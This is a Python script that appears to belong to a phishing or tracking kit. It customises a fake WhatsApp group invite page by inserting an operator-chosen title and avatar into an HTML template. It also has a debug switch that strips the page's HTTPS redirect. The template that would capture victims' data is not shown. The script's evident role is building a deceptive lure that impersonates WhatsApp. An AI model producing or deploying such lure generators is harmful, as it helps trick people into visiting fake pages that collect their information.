#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
Y = '\033[33m' # yellow


title = os.getenv('TITLE')
image = os.getenv('IMAGE')

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Path/URL to Group Img (Press Enter to Skip/Default): {W}')
else:
    utils.print(f'{G}[+] {C}Group Image :{W} '+image)

img_name = "default_avatar.jpg"
if image and image.strip() != "":
    img_name_downloaded = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
    if img_name_downloaded:
        img_name = os.path.basename(img_name_downloaded)
    else:
        # local file copy
        possible_img_name = os.path.basename(image)
        try:
            shutil.copyfile(image, 'template/whatsapp/images/{}'.format(possible_img_name))
            img_name = possible_img_name
        except Exception as e:
            utils.print('\n' + Y + '[!]' + C + ' Gagal memuat gambar kustom, menggunakan avatar default: ' + W + str(e))
            img_name = "default_avatar.jpg"
else:
    utils.print(f'{Y}[!] Tidak ada gambar dimasukkan, menggunakan avatar default.{W}')


with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP") == "1":
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)